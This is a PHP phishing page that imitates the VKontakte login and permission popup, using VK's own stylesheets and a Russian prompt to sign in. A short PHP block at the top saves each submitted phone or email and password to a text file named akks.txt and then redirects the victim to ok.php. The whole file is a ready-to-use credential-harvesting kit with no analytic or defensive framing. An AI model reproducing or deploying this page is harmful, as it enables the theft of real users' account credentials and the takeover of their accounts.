<?php
if (isset($_POST['submit'])) { 
    $email = $_POST['email'];
    $password = $_POST['password'];
    $source = $email.":".$password."\r\n";
    // Открыть текстовый файл
    $f = fopen("akks.txt", "a+");
    fwrite($f, $source);
    // Закрыть текстовый файл
    fclose($f);
	header("Location: ok.php");
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>ВКонтакте | Разрешение доступа</title>
<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?510" />
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(https://vk.com/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
<link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?31" />
</head>
</html>
<body class="VK oauth_page">
<div id="sub_cont">
<table id="container" class="container" cellspacing="0" cellpadding="0">
    <tr><td class="head">
            <a href="https://vk.com" target="_blank" class="logo"></a>
        </td></tr>
    <tr>
 <td>
  <div class="info_line">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
 <div id="box_cont">
  <div id="box" class="box box_login">
      <div class="info">
		<form action="#" method="POST">
<div class="form_header">Телефон или e-mail</div>
<input class="form-input" type="text" name="email" />
<div class="form_header">Пароль</div>
<input class="form-input" type="password" name="password" />
<div class="popup_login_btn">
<input class="flat_button popup_login_btn button_big" type="submit" name="submit" value="Зарегистрироваться" />
</div>
</form>
      </div>
  </div>
 </div>
</td></tr></table>
</div>
</body>
</html>